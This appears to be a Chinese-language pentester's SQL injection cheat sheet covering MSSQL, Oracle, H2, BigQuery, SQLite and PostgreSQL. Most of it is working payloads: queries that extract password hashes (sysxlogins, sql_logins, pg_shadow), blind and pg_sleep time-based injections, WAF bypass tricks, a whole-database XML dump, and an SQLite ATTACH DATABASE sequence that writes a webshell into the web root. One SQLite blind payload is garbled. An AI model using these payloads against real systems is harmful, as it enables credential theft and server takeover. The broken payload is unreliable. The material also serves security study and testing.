- [aleenzz/MYSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)
**靶场**
- [Larryxi/MSSQL-SQLi-Labs](https://github.com/Larryxi/MSSQL-SQLi-Labs)
    - 搭建过程 : [MSSQL搭建](../../../../Integrated/Windows/实验/MSSQL搭建.md) , [asp站点搭建](../../../../Integrated/Windows/实验/asp站点搭建.md)
**相关文章**
- [SQL Server从0到1](https://mp.weixin.qq.com/s/N2siXJgmPAZ7CSIQ3FCF0w)
- [从0开始学习Microsoft SQL Server数据库攻防](https://xz.aliyun.com/t/10955)
- [窃取MSSQL各版本密码HASH](https://mp.weixin.qq.com/s/nKV25G2PAI9rxXdtbyWE3A)
**相关案例**
- [记一次苦逼的sql注入](https://mp.weixin.qq.com/s/ydzMtlJfWD4hixIo1_ul2A)
**相关工具**
- [Keramas/mssqli-duet](https://github.com/Keramas/mssqli-duet) - SQL injection script for MSSQL that extracts domain users from an Active Directory environment based on RID bruteforcing
### MSSQL 基础
- [MSSQL](../../../../Integrated/数据库/笔记/MSSQL.md)
**基本参数**
```sql
@@version       -- 数据库版本
user            -- 获取当前数据库用户名
db_name()       -- 当前数据库名 其中db_name(N)可以来遍历其他数据库
;select user    -- 查询是否支持多语句
@@servername    -- 服务器名称
```
**查询密码HASH**
```sql
-- MSSQL 2000版本
select name,password from master.dbo.sysxlogins
-- MSSQL 2005及以后版本
select name,password_hash from sys.sql_logins
```
### 正则表达式攻击
MSSQL 所用的正则表达式并不是标准正则表达式 ，该表达式使用 like 关键词
```sql
1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name LIKE '[a-z]%' )
```
该查询语句中，select top 1 是一个组合，不要看错了。
如果要查询其它的表名，由于不能像 mysql 那样用 limit x,1，只能使用 table_name not in (select top x table_name from information_schema.tables) 意义是：表名没有在前 x 行里，其实查询的就是第 x+1 行。
例如查询第二行的表名：
```sql
1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name NOT IN ( SELECT TOP 1 table_name FROM information_schema.tables) and table_name LIKE '[a-z]%' )
```
表达式的顺序：
```
'n[a-z]%' -> 'ne[a-z]%' -> 'new[a-z]%' -> 'news[a-z]%' -> TRUE
```
之所以表达式 news[a-z] 查询后返回正确是应为 % 代表 0-n 个字符，使用 "_" 则只能代表一个字符。故确认后续是否还有字符可用如下表达式
```
'news%' TRUE -> 'news_' FALSE
```
同理可以用相同的方法获取字段，值。这里就不再详细描述了。
### bypass 技巧
**select from 后的位置**
- 空白符号
    ```
    01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
    ```
    需要做 urlencode,sqlserver 中的表示空白字符比较多,靠黑名单去阻断一般不合适.
- 注释符号
    Mssql 也可以使用注释符号 `/**/`
- `.` 符号
- `:` 号
**select from 之间的位置**
- 空白符号
- 注释符号
- `:` 号
**and 之后的位置**
- 空白符号
- 注释符号
- `:` 号
- `%2b` 号
**常见过滤函数**
- 字符串截取函数
    ```
    Substring(@@version,1,1)
    Left(@@version,1)
    Right(@@version,1)
    ```
- 字符串转换函数
    ```
    Ascii(‘a’) 这里的函数可以在括号之间添加空格的, 一些 waf 过滤不严会导致 bypass
    Char(‘97’)
    ```
- Mssql 支持多语句查询,因此可以使用;结束上面的查询语句,然后执行自己构造的语句.动态执行.
    使用 exec 的方式:
    使用 sp_executesql 的方式:
### 提权/GETSHELL
- [MSSQL提权](../../软件服务安全/实验/MSSQL.md)
---
## oracle
用于是否是判断 oracle 数据库的方法
```
and (select count(*) from sys.user_tables)>0
```
**相关案例**
- [BountyHunterInChina/重生之我是赏金猎人(一)-轻松GET某src soap注入](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E4%B8%80)-%E8%BD%BB%E6%9D%BEGET%E6%9F%90src%20soap%E6%B3%A8%E5%85%A5.pdf)
### bypass 技巧
oracle 中文版中,中文括号 `（ ）`可以代理英文且不报错
```
select （1+1） from test;
```
---
## H2 database
**相关文章**
- [一步一步教你漏洞挖掘之某系统从H2 database SQL注入漏洞到RCE回显构造](https://mp.weixin.qq.com/s/fZFNj2T0IITL8-9na_AWTQ)
---
## BigQuery
**相关文章**
- [BigQuery SQL Injection Cheat Sheet](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
**Playground**
- https://console.cloud.google.com/bigquery
**信息收集**
```
SELECT * FROM INFORMATION_SCHEMA.SCHEMATA
select @@project_id
select session_user()
```
---
## SQLite
SQLite 是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。它是一个零配置的数据库，这意味着与其他数据库不一样，你不需要在系统中配置。
SQLite 数据库的特点是它每一个数据库都是一个文件，当你查询表的完整信息时会得到创建表的语句。
**相关文章**
- [SQLite注入](https://mp.weixin.qq.com/s/12lN4zeezSsCLYvRYJfAuw)
### SQLite 基础
- https://www.runoob.com/sqlite/sqlite-commands.html
**注释**
```sql
;       注释内容，表示单行注释
--      注意--后面有一个空格
/* */   多行注释
```
**查看版本**
```sql
select sqlite_version();
```
**查询表名和列名**
```sql
select sql from sqlite_master
```
**布尔盲注**
布尔盲注通过查询正确和错误返回的页面不同来判断数据内容。
SQLite不支持ascii，所以直接通过字符去查询，这里和mysql不同，这个区分大小写。也没有mid,left等函数。
```sql
-1' or substr((select group_concat(sql) from sqlite_master),1,1)'3') then randomblob(300000000) else 0 end)/*
```
**写 webshell**
SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。
```
ATTACH DATABASE file_name AS database_name;
```
如果附加数据库不存在，就会创建该数据库，如果数据库文件设置在web目录下，就可以写入webshell。
```
ATTACH DATABASE '/var/www/html/shell.php' AS shell;
create TABLE shell.exp (webshell text);
insert INTO shell.exp (webshell) VALUES ('');
```
---
## Postgresql
**相关文章**
- [SQL注入渗透PostgreSQL(bypass tricks)](https://xz.aliyun.com/t/8621)
### Postgresql 基础
- [Postgresql](../../../../Integrated/数据库/笔记/Postgresql.md)
**忽略**
```sql
SELECT 'admin' FROM users;
SELECT 'admin' OR 1 = 1; -- -' FROM users;
```
**||**
`||` 可用于将数据附加到同一行的输出中
```sql
SELECT ''||password FROM users; -- -';
```
**通过延时判断是否是 Postgresql 数据库的方法**
SELECT
```sql
-- 如果参数是整数：
pg_sleep(20); -- -
-- 如果参数是字符串：
'||pg_sleep(20); -- -
```
FROM
```sql
-- 当payload的第一个SELECT子句中提供了有效的表名(TABLE)和列(COLUMN)时
(SELECT * FROM [TABLE] WHERE [COLUMN]=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
-- 或者
(SELECT * FROM [TABLE] WHERE [COLUMN] = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
-- 当已知列需要一个Int
(SELECT * FROM address WHERE address_id=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
-- 当已知列需要字符串时
(SELECT * FROM address WHERE address = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
```
WHERE
```sql
-- 如果参数是整数
1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END)); -- -
-- 如果参数是字符串
'||(pg_sleep(20)); -- -
```
HAVING
```sql
-- 如果参数是整数：
(COUNT((SELECT pg_sleep(20)))=1); -- -
-- 如果参数是字符串：
t' AND (SELECT COUNT((SELECT pg_sleep(20)))) = 1; -- -
```
OFFSET
```sql
-- 如果参数是整数：
1|(SELECT COUNT((SELECT pg_sleep(20)))); -- -
-- 如果参数是字符串
1'::integer + 1|(SELECT COUNT((SELECT pg_sleep(20)))); -- -
```
**当注入点在 WHERE 时**
可以配合 `||`
```sql
select * from test where username='admin' and password='admin'
select * from test where username='admin' and password=''||(select password);
```
### bypass 技巧
**注释**
```sql
SELECT version();
SELECT/**/version();
```
**代替引号**
```sql
select pg_ls_dir('/etc');
select pg_ls_dir($$/etc$$);         -- 使用 $ 符号
select pg_ls_dir($test$/etc$test$); -- 使用标签
select pg_ls_dir(CHR(47)||CHR(101)||CHR(116)||CHR(99)); -- 采取CHR()函数
```
**query_to_xml**
query_to_xml 可以将结果返回在一行里，不必担心限制或多行
```sql
SELECT query_to_xml('SELECT usename, passwd FROM pg_shadow;',true,true,'')
```
**DATABASE_TO_XML**
使用 xml 帮助程序通过单个查询转储整个数据库
```sql
SELECT database_to_xml(true,true,'')
```
### 提权/GETSHELL
- [Postgresql提权](../../软件服务安全/实验/Postgresql.md)